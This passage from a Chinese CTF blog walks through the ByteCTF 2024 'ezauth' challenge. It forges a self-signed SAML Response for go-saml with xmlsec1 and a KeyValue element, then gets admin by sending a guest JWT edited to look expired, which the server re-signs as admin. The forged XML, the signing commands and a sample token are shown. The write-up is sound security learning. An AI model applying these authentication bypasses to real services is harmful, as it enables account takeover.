failed:subject=/C=AU/ST=Some-State/O=Internet Widgits Pty Ltd; issuer=/C=AU/ST=Some-State/O=Internet Widgits Pty Ltd; err=18; msg=self-signed certificate</span><br><span class="line">                                                                                                                                                                                                                               </span><br><span class="line">┌──(root㉿kali)-[/home/kali/Desktop/bytectf2024_ezauth]</span><br><span class="line">└─# xmlsec1 --verify --pubkey-cert-pem /home/kali/Desktop/bytectf2024_ezauth/cert.pem --id-attr:ID urn:oasis:names:tc:SAML:2.0:protocol:Response signed-idp2sp5.xml</span><br><span class="line">func=xmlSecOpenSSLX509StoreVerify:file=x509vfy.c:line=389:obj=x509-store:subj=unknown:error=71:certificate verification failed:X509_verify_cert: subject=/C=AU/ST=Some-State/O=Internet Widgits Pty Ltd; issuer=/C=AU/ST=Some-State/O=Internet Widgits Pty Ltd; err=18; msg=self-signed certificate</span><br><span class="line">func=xmlSecOpenSSLX509StoreVerify:file=x509vfy.c:line=432:obj=x509-store:subj=unknown:error=71:certificate verification failed:subject=/C=AU/ST=Some-State/O=Internet Widgits Pty Ltd; issuer=/C=AU/ST=Some-State/O=Internet Widgits Pty Ltd; err=18; msg=self-signed certificate</span><br><span class="line">OK</span><br><span class="line">SignedInfo References (ok/all): 1/1</span><br><span class="line">Manifests References (ok/all): 0/0</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>找一个文档示例代码看看</p>
<p><img src="/../imgs/$%7Bfiilename%7D/1731382498145.png" alt="1731382498145"></p>
<p>用这个代码去xmlsec1验证，同样失败。</p>
<p>翻规范手册</p>
<blockquote>
<p><code>KeyInfo</code> 是一个可选元素，它使收件人能够获取验证签名所需的密钥。<a target="_blank" rel="noopener" href="https://www.w3.org/TR/xmldsig-core/#sec-X509Data">XML 签名语法和处理版本 1.1 — XML Signature Syntax and Processing Version 1.1</a></p>
</blockquote>
<p>pysaml2中提供的示范代码，将RSA key 提供在了以下地方</p>
<p><img src="/../imgs/$%7Bfiilename%7D/1731383439310-17313834573841.png" alt="1731383439310"></p>
<p>正如规范所约束</p>
<p><img src="/../imgs/$%7Bfiilename%7D/image-20241112115144681.png" alt="image-20241112115144681"></p>
<p>go-saml2库的xml结构体中定义了x509</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">KeyInfo: KeyInfo&#123;</span><br><span class="line">	XMLName: xml.Name&#123;</span><br><span class="line">		Local: &quot;samlsig:KeyInfo&quot;,</span><br><span class="line">	&#125;,</span><br><span class="line">	X509Data: X509Data&#123;</span><br><span class="line">		XMLName: xml.Name&#123;</span><br><span class="line">			Local: &quot;samlsig:X509Data&quot;,</span><br><span class="line">		&#125;,</span><br><span class="line">		X509Certificate: X509Certificate&#123;</span><br><span class="line">			XMLName: xml.Name&#123;</span><br><span class="line">				Local: &quot;samlsig:X509Certificate&quot;,</span><br><span class="line">			&#125;,</span><br><span class="line">			Cert: &quot;&quot;, // caller must populate cert,</span><br><span class="line">		&#125;,</span><br><span class="line">	&#125;,</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure>

<p>但现在我们给他赋值并没有用</p>
<p>看一下W&amp;M的wp（W&amp;M的web真的强，DJB的web也是顶流）</p>
<p><a target="_blank" rel="noopener" href="https://blog.wm-team.cn/index.php/archives/81/#ezauth">ByteCTF 2024 By W&amp;M - W&amp;M Team</a></p>
<blockquote>
<p><code>KeyValue</code> 元素包含一个可用于验证签名的公钥</p>
</blockquote>
<p>改了一下结构体</p>
<p>添加了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">response.Signature.KeyInfo.KeyValue.Value = cert</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>直接手动改一下idp2sp5.xml 生成idp2sp6.xml</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&#x27;1.0&#x27; encoding=&#x27;UTF-8&#x27;?&gt;</span><br><span class="line">&lt;samlp:Response xmlns:samlp=&quot;urn:oasis:names:tc:SAML:2.0:protocol&quot; xmlns:saml=&quot;urn:oasis:names:tc:SAML:2.0:assertion&quot; xmlns:samlsig=&quot;http://www.w3.org/2000/09/xmldsig#&quot; Destination=&quot;http://localhost:8000/saml_consume&quot; ID=&quot;_ed59d777-c777-46ef-55e3-ab3cebf7d477&quot; Version=&quot;2.0&quot; IssueInstant=&quot;2024-11-12T03:10:59.041732925Z&quot; InResponseTo=&quot;authnRequestIdRespondingTo&quot;&gt;</span><br><span class="line">    &lt;saml:Issuer&gt;http://localhost:8000/saml&lt;/saml:Issuer&gt;</span><br><span class="line">    &lt;samlsig:Signature Id=&quot;_944fac9f-fb10-4e72-61b6-3c8c1928777b&quot;&gt;</span><br><span class="line">        &lt;samlsig:SignedInfo&gt;</span><br><span class="line">            &lt;samlsig:CanonicalizationMethod Algorithm=&quot;http://www.w3.org/2001/10/xml-exc-c14n#&quot;&gt;&lt;/samlsig:CanonicalizationMethod&gt;</span><br><span class="line">            &lt;samlsig:SignatureMethod Algorithm=&quot;http://www.w3.org/2000/09/xmldsig#rsa-sha1&quot;&gt;&lt;/samlsig:SignatureMethod&gt;</span><br><span class="line">            &lt;samlsig:Reference URI=&quot;&quot;&gt;</span><br><span class="line">                &lt;samlsig:Transforms&gt;</span><br><span class="line">                    &lt;samlsig:Transform Algorithm=&quot;http://www.w3.org/2000/09/xmldsig#enveloped-signature&quot;&gt;&lt;/samlsig:Transform&gt;</span><br><span class="line">                &lt;/samlsig:Transforms&gt;</span><br><span class="line">                &lt;samlsig:DigestMethod Algorithm=&quot;http://www.w3.org/2000/09/xmldsig#sha1&quot;&gt;&lt;/samlsig:DigestMethod&gt;</span><br><span class="line">                &lt;samlsig:DigestValue&gt;&lt;/samlsig:DigestValue&gt;</span><br><span class="line">            &lt;/samlsig:Reference&gt;</span><br><span class="line">        &lt;/samlsig:SignedInfo&gt;</span><br><span class="line">        &lt;samlsig:SignatureValue&gt;&lt;/samlsig:SignatureValue&gt;</span><br><span class="line">        &lt;samlsig:KeyInfo&gt;</span><br><span class="line">            &lt;samlsig:KeyValue&gt;MIIDazCCAlOgAwIBAgIUexfKkWtRKAWRvcfzl7/MnrZIyQAwDQYJKoZIhvcNAQELBQAwRTELMAkGA1UEBhMCQVUxEzARBgNVBAgMClNvbWUtU3RhdGUxITAfBgNVBAoMGEludGVybmV0IFdpZGdpdHMgUHR5IEx0ZDAeFw0yNDExMTExMjIyNDZaFw0yNzA4MDgxMjIyNDZaMEUxCzAJBgNVBAYTAkFVMRMwEQYDVQQIDApTb21lLVN0YXRlMSEwHwYDVQQKDBhJbnRlcm5ldCBXaWRnaXRzIFB0eSBMdGQwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC2FYuexjL80KhiWeBnTLMCi38g9tho+bhlM0TA3q1ziA5E4oE0pYrHBl1BqxyqtN/Xfb/0CZyry4Hvv/FRpL2C/SsQ7EMJZM3zo4B4iejK4H+jaSNc8T9BWuqnL/d7rpBvB5xA8SrhooM62tGGHOVIaa1ZZP41KS+MQzQudOQsG7rGJa0325EqI8WdsFUvnGgxlWK5M0WyBEtk8kCOVcCx9ONmuDoLsLSDZwwfef5mzuZuvA7A7nvLI90r42MU3g1aopW5pqWPk7mvwh87BGmYzCHz1LN/2mgwC0J8bVx9qM9MLWTkut2GrUgQoxpU7h7XNmReBfdZW+U2lFTr/Ta3AgMBAAGjUzBRMB0GA1UdDgQWBBQNRP2woqWf9nWytFX48shBrWkqIzAfBgNVHSMEGDAWgBQNRP2woqWf9nWytFX48shBrWkqIzAPBgNVHRMBAf8EBTADAQH/MA0GCSqGSIb3DQEBCwUAA4IBAQBpL+lPyfIQoJIqdI/QcNlFX3h6KwJDUk9XwUT6tmOr19mTvQ4FNQMOITLkRAdj1pPDHGq80EUdt+V5dxmSPoAGco4tuzgdHViw5S/TQd3m38Q/oIeJouxC31N8GuLlD8RWzJYMrru+cXVX7nhDKE33pUTfqTWjh7keUMp8wbk1K1fMfkAy+U8XOwYnRnkuNxO2GZwnobrvFhSctJSFzDjOxMfp4F+/STPoUCwFkdYazESGpwfd8n8vFIpTgVNPen7py3xGM6XT8uWl99o5m8lQRBP/wTyqE0lIlaLB8F7OHHjZU4TiuPDm8On1UigrBBSdkTzBjTVJ0e8fdfkceoW7&lt;/samlsig:KeyValue&gt;</span><br><span class="line">            &lt;samlsig:X509Data&gt;</span><br><span class="line">                &lt;samlsig:X509Certificate&gt;MIIDazCCAlOgAwIBAgIUexfKkWtRKAWRvcfzl7/MnrZIyQAwDQYJKoZIhvcNAQELBQAwRTELMAkGA1UEBhMCQVUxEzARBgNVBAgMClNvbWUtU3RhdGUxITAfBgNVBAoMGEludGVybmV0IFdpZGdpdHMgUHR5IEx0ZDAeFw0yNDExMTExMjIyNDZaFw0yNzA4MDgxMjIyNDZaMEUxCzAJBgNVBAYTAkFVMRMwEQYDVQQIDApTb21lLVN0YXRlMSEwHwYDVQQKDBhJbnRlcm5ldCBXaWRnaXRzIFB0eSBMdGQwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC2FYuexjL80KhiWeBnTLMCi38g9tho+bhlM0TA3q1ziA5E4oE0pYrHBl1BqxyqtN/Xfb/0CZyry4Hvv/FRpL2C/SsQ7EMJZM3zo4B4iejK4H+jaSNc8T9BWuqnL/d7rpBvB5xA8SrhooM62tGGHOVIaa1ZZP41KS+MQzQudOQsG7rGJa0325EqI8WdsFUvnGgxlWK5M0WyBEtk8kCOVcCx9ONmuDoLsLSDZwwfef5mzuZuvA7A7nvLI90r42MU3g1aopW5pqWPk7mvwh87BGmYzCHz1LN/2mgwC0J8bVx9qM9MLWTkut2GrUgQoxpU7h7XNmReBfdZW+U2lFTr/Ta3AgMBAAGjUzBRMB0GA1UdDgQWBBQNRP2woqWf9nWytFX48shBrWkqIzAfBgNVHSMEGDAWgBQNRP2woqWf9nWytFX48shBrWkqIzAPBgNVHRMBAf8EBTADAQH/MA0GCSqGSIb3DQEBCwUAA4IBAQBpL+lPyfIQoJIqdI/QcNlFX3h6KwJDUk9XwUT6tmOr19mTvQ4FNQMOITLkRAdj1pPDHGq80EUdt+V5dxmSPoAGco4tuzgdHViw5S/TQd3m38Q/oIeJouxC31N8GuLlD8RWzJYMrru+cXVX7nhDKE33pUTfqTWjh7keUMp8wbk1K1fMfkAy+U8XOwYnRnkuNxO2GZwnobrvFhSctJSFzDjOxMfp4F+/STPoUCwFkdYazESGpwfd8n8vFIpTgVNPen7py3xGM6XT8uWl99o5m8lQRBP/wTyqE0lIlaLB8F7OHHjZU4TiuPDm8On1UigrBBSdkTzBjTVJ0e8fdfkceoW7&lt;/samlsig:X509Certificate&gt;</span><br><span class="line">            &lt;/samlsig:X509Data&gt;</span><br><span class="line">        &lt;/samlsig:KeyInfo&gt;</span><br><span class="line">    &lt;/samlsig:Signature&gt;</span><br><span class="line">    &lt;samlp:Status&gt;</span><br><span class="line">        &lt;samlp:StatusCode Value=&quot;urn:oasis:names:tc:SAML:2.0:status:Success&quot;&gt;&lt;/samlp:StatusCode&gt;</span><br><span class="line">    &lt;/samlp:Status&gt;</span><br><span class="line">    &lt;saml:Assertion ID=&quot;_132ebb3f-a299-42c8-5960-f21bed10cce7&quot; Version=&quot;2.0&quot; xmlns:xs=&quot;http://www.w3.org/2001/XMLSchema&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:saml=&quot;urn:oasis:names:tc:SAML:2.0:assertion&quot; IssueInstant=&quot;2024-11-12T03:10:59.041740369Z&quot;&gt;</span><br><span class="line">        &lt;saml:Issuer&gt;http://localhost:8000/saml&lt;/saml:Issuer&gt;</span><br><span class="line">        &lt;saml:Subject&gt;</span><br><span class="line">            &lt;saml:NameID Format=&quot;urn:oasis:names:tc:SAML:2.0:nameid-format:transient&quot;&gt;userIdThatYouAuthenticated&lt;/saml:NameID&gt;</span><br><span class="line">            &lt;saml:SubjectConfirmation Method=&quot;urn:oasis:names:tc:SAML:2.0:cm:bearer&quot;&gt;</span><br><span class="line">                &lt;saml:SubjectConfirmationData InResponseTo=&quot;authnRequestIdRespondingTo&quot; NotOnOrAfter=&quot;2024-11-12T03:15:59.04174105Z&quot; Recipient=&quot;http://localhost:8000/saml_consume&quot;&gt;&lt;/saml:SubjectConfirmationData&gt;</span><br><span class="line">            &lt;/saml:SubjectConfirmation&gt;</span><br><span class="line">        &lt;/saml:Subject&gt;</span><br><span class="line">        &lt;saml:Conditions NotBefore=&quot;2024-11-12T03:05:59.041741731Z&quot; NotOnOrAfter=&quot;2024-11-12T03:15:59.041742162Z&quot;&gt;&lt;/saml:Conditions&gt;</span><br><span class="line">        &lt;saml:AttributeStatement&gt;</span><br><span class="line">            &lt;saml:Attribute Name=&quot;uid&quot; NameFormat=&quot;urn:oasis:names:tc:SAML:2.0:attrname-format:basic&quot;&gt;</span><br><span class="line">                &lt;saml:AttributeValue xsi:type=&quot;xs:string&quot;&gt;userIdThatYouAuthenticated&lt;/saml:AttributeValue&gt;</span><br><span class="line">            &lt;/saml:Attribute&gt;</span><br><span class="line">            &lt;saml:Attribute Name=&quot;email&quot; NameFormat=&quot;urn:oasis:names:tc:SAML:2.0:attrname-format:basic&quot;&gt;</span><br><span class="line">                &lt;saml:AttributeValue xsi:type=&quot;xs:string&quot;&gt;someone@domain&lt;/saml:AttributeValue&gt;</span><br><span class="line">            &lt;/saml:Attribute&gt;</span><br><span class="line">        &lt;/saml:AttributeStatement&gt;</span><br><span class="line">    &lt;/saml:Assertion&gt;</span><br><span class="line">&lt;/samlp:Response&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">xmlsec1 --sign --privkey-pem /home/kali/Desktop/bytectf2024_ezauth/key.pem --id-attr:ID urn:oasis:names:tc:SAML:2.0:protocol:Response --output signed-idp2sp6.xml idp2sp6.xml</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">xmlsec1 --verify --pubkey-cert-pem /home/kali/Desktop/bytectf2024_ezauth/frntn-x509-san.crt --id-attr:ID urn:oasis:names:tc:SAML:2.0:protocol:Response signed-idp2sp6.xml</span><br></pre></td></tr></table></figure>

<p>然后就通了。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali/Desktop/bytectf2024_ezauth]</span><br><span class="line">└─# xmlsec1 --sign --privkey-pem /home/kali/Desktop/bytectf2024_ezauth/key.pem --id-attr:ID urn:oasis:names:tc:SAML:2.0:protocol:Response --output signed-idp2sp6.xml idp2sp6.xml</span><br><span class="line">func=xmlSecOpenSSLX509StoreVerify:file=x509vfy.c:line=389:obj=x509-store:subj=unknown:error=71:certificate verification failed:X509_verify_cert: subject=/C=AU/ST=Some-State/O=Internet Widgits Pty Ltd; issuer=/C=AU/ST=Some-State/O=Internet Widgits Pty Ltd; err=18; msg=self-signed certificate</span><br><span class="line">func=xmlSecOpenSSLX509StoreVerify:file=x509vfy.c:line=432:obj=x509-store:subj=unknown:error=71:certificate verification failed:subject=/C=AU/ST=Some-State/O=Internet Widgits Pty Ltd; issuer=/C=AU/ST=Some-State/O=Internet Widgits Pty Ltd; err=18; msg=self-signed certificate</span><br><span class="line">                                                                                                                                                                                                                               </span><br><span class="line">┌──(root㉿kali)-[/home/kali/Desktop/bytectf2024_ezauth]</span><br><span class="line">└─# xmlsec1 --verify --pubkey-cert-pem /home/kali/Desktop/bytectf2024_ezauth/frntn-x509-san.crt --id-attr:ID urn:oasis:names:tc:SAML:2.0:protocol:Response signed-idp2sp6.xml</span><br><span class="line">OK</span><br><span class="line">SignedInfo References (ok/all): 1/1</span><br><span class="line">Manifests References (ok/all): 0/0</span><br><span class="line">                                                                                                                                                                                                                               </span><br><span class="line">┌──(root㉿kali)-[/home/kali/Desktop/bytectf2024_ezauth]</span><br><span class="line">└─# xmlsec1 --verify  --id-attr:ID urn:oasis:names:tc:SAML:2.0:protocol:Response signed-idp2sp6.xml </span><br><span class="line">OK</span><br><span class="line">SignedInfo References (ok/all): 1/1</span><br><span class="line">Manifests References (ok/all): 0/0</span><br><span class="line">                                     </span><br></pre></td></tr></table></figure>

<p>不过很疑问，为什么X509Certificate不行？非常的迷惑，但有一点被我忽视的文章，里面也确确实实用到了KeyValue。</p>
<p>即<a target="_blank" rel="noopener" href="https://github.com/RyanBoomer30/CVE-2021-21239-Exploit/blob/main/main.py">CVE-2021-21239-Exploit&#x2F;main.py at main · RyanBoomer30&#x2F;CVE-2021-21239-Exploit</a>里的</p>
<pre><code>key_info = ET.SubElement(new_signature, &#39;KeyInfo&#39;)
key_value = ET.SubElement(key_info, &#39;KeyValue&#39;)
</code></pre>
<h3 id="为什么X509不行？"><a href="#为什么X509不行？" class="headerlink" title="为什么X509不行？"></a>为什么X509不行？</h3><p>实际上不是X509不行，在规范上是允许X509的，但是xmlsec1不认</p>
<blockquote>
<p>To sign a XML document we need two things:<br>要对 XML 文档进行签名，我们需要两样东西：</p>
<ul>
<li>The private key. 私钥。</li>
<li>The XML document to sign, but it should be a XML signing template. That means a XML that in addition of your data has the necesarry information needed to sign (which algorithms, which signing mode, which key and so on…).<br>要签名的 XML 文档，但它应该是 XML 签名模板。这意味着 XML 除了您的数据之外，还具有签名所需的必要信息（哪些算法、哪种签名模式、哪个密钥等等……</li>
</ul>
</blockquote>
<p><a target="_blank" rel="noopener" href="https://users.dcc.uchile.cl/~pcamacho/tutorial/web/xmlsec/xmlsec.html#htoc7">使用 XMLSec 进行 XML 签名和 XML 加密简介 — An Introduction to XML Signature and XML Encryption with XMLSec</a></p>
<p>WM大佬们对 response.Signature.KeyInfo.KeyValue.Value赋值</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">response.Signature.KeyInfo.KeyValue.Value = cert</span><br></pre></td></tr></table></figure>

<p>赋值没有起作用，真正起作用的是建立这个结构。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;KeyInfo&gt;</span><br><span class="line">   &lt;KeyValue /&gt;</span><br></pre></td></tr></table></figure>

<p>xmlsec1识别到这个结构，随即将公钥存储在其中。我们是用私钥加密，可能流程是</p>
<ol>
<li>xmlsec1 sign</li>
<li>xmlsec1 scan2get Keyinfo</li>
<li>xmlsec1 generate public key</li>
<li>xmlsec1 put public key</li>
</ol>
<p>回过头看，test.xml中，也正是因为有这个结构，才能通过自带证书签名。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;KeyInfo&gt;</span><br><span class="line">    &lt;KeyValue/&gt;</span><br><span class="line">&lt;/KeyInfo&gt;</span><br></pre></td></tr></table></figure>

<p>总之，我们这一部分问题解决了。</p>
<p>让我们添加一下 来收尾</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Keyvalue: Keyvalue&#123;</span><br><span class="line">	XMLName: xml.Name&#123;</span><br><span class="line">		Local: &quot;samlsig:KeyValue&quot;,</span><br><span class="line">	&#125;,</span><br><span class="line">	value: &quot;&quot;,</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure>

<h2 id="如何绕过jwt"><a href="#如何绕过jwt" class="headerlink" title="如何绕过jwt"></a>如何绕过jwt</h2><p>下发的jwt是guest，获取flag需要是admin</p>
<p>jwt校验的中间件 先解析jwt ，如果过期，则重新签名。没有其他逻辑</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">		if err != nil &amp;&amp; !errors.Is(err, jwt.ErrTokenExpired) &#123;</span><br><span class="line">		if err != nil &amp;&amp; errors.Is(err, jwt.ErrTokenExpired) &#123;</span><br><span class="line">两个不同的判断条件，怎么进入二</span><br></pre></td></tr></table></figure>

<p>怎么err报错且过期</p>
<p>跟jwt的parse逻辑</p>
<p><img src="/../imgs/$%7Bfiilename%7D/1731393175901.png" alt="1731393175901">W&amp;M这里的流程是 </p>
<p><img src="/../imgs/$%7Bfiilename%7D/(null)-20240922140136146.(null)" alt="img"></p>
<p>但是我本地看版本不一样了。 改了。</p>
<p><a target="_blank" rel="noopener" href="https://github.com/golang-jwt/jwt/commit/7b1c1c00a171c6c79bbdb40e4ce7d197060c1c2c#diff-83eb8e32639d01cf443d6d8bde24c1c8be78766090d8c5f8586c36250cfedca6">Merge commit from fork · golang-jwt&#x2F;jwt@7b1c1c0</a></p>
<p>改了。(<em>^_^</em>)</p>
<p>回退一下</p>
<p><img src="/../imgs/$%7Bfiilename%7D/1731394143308.png" alt="1731394143308"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">// Valid validates time based claims &quot;exp, iat, nbf&quot;. There is no accounting for clock skew.</span><br><span class="line">// As well, if any of the above claims are not in the token, it will still</span><br><span class="line">// be considered a valid claim.</span><br><span class="line">func (c StandardClaims) Valid() error &#123;</span><br><span class="line">	vErr := new(ValidationError)</span><br><span class="line">	now := TimeFunc().Unix()</span><br><span class="line"></span><br><span class="line">	// The claims below are optional, by default, so if they are set to the</span><br><span class="line">	// default value in Go, let&#x27;s not fail the verification for them.</span><br><span class="line">	if !c.VerifyExpiresAt(now, false) &#123;</span><br><span class="line">		delta := time.Unix(now, 0).Sub(time.Unix(c.ExpiresAt, 0))</span><br><span class="line">		vErr.Inner = fmt.Errorf(&quot;%s by %s&quot;, ErrTokenExpired, delta)</span><br><span class="line">		vErr.Errors |= ValidationErrorExpired</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	if !c.VerifyIssuedAt(now, false) &#123;</span><br><span class="line">		vErr.Inner = ErrTokenUsedBeforeIssued</span><br><span class="line">		vErr.Errors |= ValidationErrorIssuedAt</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	if !c.VerifyNotBefore(now, false) &#123;</span><br><span class="line">		vErr.Inner = ErrTokenNotValidYet</span><br><span class="line">		vErr.Errors |= ValidationErrorNotValidYet</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	if vErr.valid() &#123;</span><br><span class="line">		return nil</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	return vErr</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>先看payload里面的过期没过期，那我们可以伪造一个过期时间，让validate 时间时候就报错 ，这样不会verify看我们的用户对不对，我们可以跳到过期重新签发，签admin的权限</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MzE5OTkzODQsImlzcyI6ImJ5dGVjdGYiLCJ1c2VybmFtZSI6Imd1ZXN0In0.AtIpqfF1oxYs46_8AJaDHVe63wbzVcVslYS9IJgLZds</span><br></pre></td></tr></table></figure>

<p><img src="/../imgs/$%7Bfiilename%7D/image-20241112150901372.png" alt="image-20241112150901372"></p>
<p>改payload，时间 减去7 * 24  * 3600 + 1   即过期，user改admin，签名不用改。</p>
<p>那么问题来了。这个题不用生成jwt就可以呀</p>
<p>题目并没有做限制，如果服务端时区设置不一样，爆破也能爆破出一个合理的过期时间。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p><a target="_blank" rel="noopener" href="https://docs.google.com/document/d/157fGn7lLP1uBuRz8zUgRDWTDklKznljeOWwRQ-C6uFg/edit?usp=sharing">CVE-2021-21239 Report - Google Docs</a></p>
<p><a target="_blank" rel="noopener" href="https://securitylab.github.com/advisories/GHSL-2023-121_go-saml__archived_/">GHSL-2023-121: SAML authentication bypass vulnerability in RobotsAndPencils&#x2F;go-saml - CVE-2023-48703 | GitHub Security Lab</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/RobotsAndPencils/go-saml">RobotsAndPencils&#x2F;go-saml: A just good enough SAML client library written in Go.</a></p>
<p><a target="_blank" rel="noopener" href="https://users.dcc.uchile.cl/~pcamacho/tutorial/web/xmlsec/xmlsec.html#htoc7">使用 XMLSec 进行 XML 签名和 XML 加密简介 — An Introduction to XML Signature and XML Encryption with XMLSec</a></p>
<p><a target="_blank" rel="noopener" href="https://www.samltool.com/generic_sso_res.php">SAML Response Examples - SAML Assertion Example | SAMLTool.com</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.wm-team.cn/index.php/archives/81/#ezauth">ByteCTF 2024 By W&amp;M - W&amp;M Team</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh">
    <link itemprop="mainEntityOfPage" href="http://example.com/2024/11/04/%E4%BB%8E%E5%BC%BA%E7%BD%91%E6%9D%AF2024_ezcalc%E5%AD%A6service-worker/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Charger0">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Charger0">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/11/04/%E4%BB%8E%E5%BC%BA%E7%BD%91%E6%9D%AF2024_ezcalc%E5%AD%A6service-worker/" class="post-title-link" itemprop="url">强网杯 ezcalc</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2024-11-05 03:38:24" itemprop="dateCreated datePublished" datetime="2024-11-05T03:38:24+08:00">2024-11-05</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2024-11-13 17:51:02" itemprop="dateModified" datetime="2024-11-13T17:51:02+08:00">2024-11-13</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="从强网杯2024-ezcalc学service-worker"><a href="#从强网杯2024-ezcalc学service-worker" class="headerlink" title="从强网杯2024_ezcalc学service-worker"></a>从强网杯2024_ezcalc学service-worker</h2><p>附件下载：<a target="_blank" rel="noopener" href="https://github.com/CTF-Archives/2024-qwbs8">https://github.com/CTF-Archives/2024-qwbs8</a></p>
<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>windows+webstorm   搭建bot</p>
<p>linux+goland 搭建app</p>
